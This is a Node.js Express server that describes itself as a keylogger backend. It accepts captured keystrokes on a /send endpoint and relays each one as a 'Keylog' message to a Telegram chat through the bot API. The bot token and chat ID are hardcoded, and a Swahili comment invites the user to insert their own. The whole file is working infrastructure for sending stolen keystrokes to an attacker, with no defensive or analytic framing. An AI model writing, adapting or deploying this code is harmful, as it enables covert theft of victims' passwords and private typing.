const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 5000;

// 👇 Weka token na chat ID yako hapa
const BOT_TOKEN = "8246860772:AAF8iybKlcwUQdeSAv4s0tJurejRHcbAKhY";
const CHAT_ID = "8303486983";

app.use(bodyParser.json());

app.post("/send", async (req, res) => {
  const { key } = req.body;

  if (key) {
    const message = `🖥️ Keylog: ${key}`;

    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: message
      });
      res.send("Sent");
    } catch (error) {
      console.error("Telegram Error:", error.message);
      res.status(500).send("Failed");
    }
  } else {
    res.status(400).send("No key provided");
  }
});

app.get("/", (req, res) => {
  res.send("Keylogger backend is running 🚀");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});